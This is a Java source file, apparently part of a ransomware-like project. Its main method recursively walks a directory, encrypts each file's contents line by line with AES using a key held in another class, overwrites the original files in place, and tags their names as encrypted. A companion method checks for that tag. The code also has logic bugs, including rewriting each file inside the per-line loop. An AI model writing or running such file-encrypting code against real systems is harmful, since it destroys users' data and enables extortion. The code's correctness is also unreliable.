package encrypt;

import java.io.IOException;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Iterator;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Encrypt 
{
	Encrypt(){};
	
	public static String encrypt(String key, String initVector, String value) 
	{
        try 
        {
            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");

            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
            cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);

            byte[] encrypted = cipher.doFinal(value.getBytes());

            return Base64.getEncoder().encodeToString(encrypted);
        } 
        catch (Exception ex) 
        {
            ex.printStackTrace();
        }

        return null;
    }

	public static void encryptAndRename(Path path)
	{
	    try (DirectoryStream<Path> stream = Files.newDirectoryStream(path)) 
	    {
	        for (Path entry : stream) 
	        {
	            if (entry.getFileName().toString().contains(encrypt.Files.encryptTag))
	            {
	            	break;
	            }
	            
	            if (Files.isDirectory(entry)) 
	            {
	            	System.out.println("Director: " + entry.getFileName());
	                encryptAndRename(entry);
	            }
	            else
	            {
	            	String currentFilePath = entry.toAbsolutePath().toString();
	            	
	            	List<String> currentFileContent = encrypt.Files.readFromFile(currentFilePath);
	            	List<String> currentFileContentEncrypted = new ArrayList<String>();
	            	
	            	Iterator<String> cfc = currentFileContent.iterator();
	            	
	            	while (cfc.hasNext())
	            	{
	            		String encrypted = encrypt(Combined.key, Combined.iv, cfc.next().toString());
	            		currentFileContentEncrypted.add(encrypted);
	            		
	            		encrypt.Files.writeToFile(currentFileContentEncrypted, currentFilePath);    
	            	}     
	            	
	            	encrypt.Files.addEncryptedTag(currentFilePath);   
	            }    
	        }
	    } 
	    catch (IOException e) 
	    {
			e.printStackTrace();
		}
	}
	
	public static boolean isEncrypted(Path path)
	{
	    try (DirectoryStream<Path> stream = Files.newDirectoryStream(path)) 
	    {
	        for (Path entry : stream) 
	        {
	            if (Files.isDirectory(entry)) 
	            {
	            	System.out.println("Director: " + entry.getFileName());
	                isEncrypted(entry);
	            }
	            else
	            {
	            	String currentFilePath = entry.toAbsolutePath().toString();
	            	
	            	System.out.println(currentFilePath);
	            	
	            	if (currentFilePath.contains(encrypt.Files.encryptTag))
	            	{
	            		System.out.println("Already encrypted.");
	            		return true;
	            	}
	            }
	        }
	    } 
	    catch (IOException e) 
	    {
			e.printStackTrace();
		}
	    
	    return false;
	}	
}




